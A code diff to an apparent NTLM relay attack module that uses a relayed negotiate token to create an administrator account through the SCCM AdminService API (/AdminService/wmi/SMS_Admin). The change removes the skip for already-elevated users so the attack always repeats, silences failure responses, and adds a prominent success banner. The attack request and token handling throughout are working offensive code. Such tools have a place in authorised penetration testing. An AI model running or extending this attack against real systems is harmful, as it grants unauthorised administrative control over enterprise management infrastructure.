@@ -27,11 +27,8 @@ class ADMINSERVICEAttack:
         # slightly modfied sendAuth func from httprelayclient.py reused here due to negotiate auth,
         # requring all action to be performed in one shot
 
-        # In test mode, we don't skip users - we want to test repeatedly
-        if not self.config.testAdminService:
-            if self.username in ELEVATED:
-                LOG.info('Skipping user %s since attack was already performed' % self.username)
-                return
+        # Always repeat attack for debugging - never skip
+        # ELEVATED list is no longer used
         
         if unpack('B', self.config.sccmAdminToken[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
             respToken2 = SPNEGO_NegTokenResp(self.config.sccmAdminToken)
@@ -136,26 +133,21 @@ class ADMINSERVICEAttack:
 
         body = json.dumps(data)
 
-        LOG.info('Adding administrator via SCCM AdminService...')
+        LOG.debug(f'Attempting AdminService attack...')
         LOG.debug(f'Request URL: /AdminService/wmi/SMS_Admin')
         LOG.debug(f'Request headers: {headers}')
         LOG.debug(f'Request body: {body}')
         self.client.request("POST", '/AdminService/wmi/SMS_Admin', headers=headers, body=body)
-        ELEVATED.append(self.username)
         res = self.client.getresponse()
 
+        # Only show output for 201 (success) - suppress 401/500
         if res.status == 201:
-            LOG.info('Server returned code 201, attack successful')
+            LOG.info('=' * 80)
+            LOG.info('=' * 80)
+            LOG.info('*** SUCCESS! ADMIN CREATED! ***')
+            LOG.info('*** SERVER RETURNED HTTP 201 - ATTACK SUCCESSFUL! ***')
+            LOG.info('=' * 80)
+            LOG.info('=' * 80)
         else:
+            # Silently consume the response for 401/500
             self.lastresult = res.read()
-            LOG.error(f'Server returned code {res.status} - attack likely failed')
-            LOG.error(f'Response headers: {dict(res.getheaders())}')
-            try:
-                if self.lastresult:
-                    response_text = self.lastresult.decode("utf-8")
-                    LOG.error(f'Response body: {response_text}')
-                else:
-                    LOG.error('Response body is empty')
-            except Exception as e:
-                LOG.error(f'Error decoding response: {e}')
-                LOG.error(f'Raw response (first 500 bytes): {self.lastresult[:500]}')
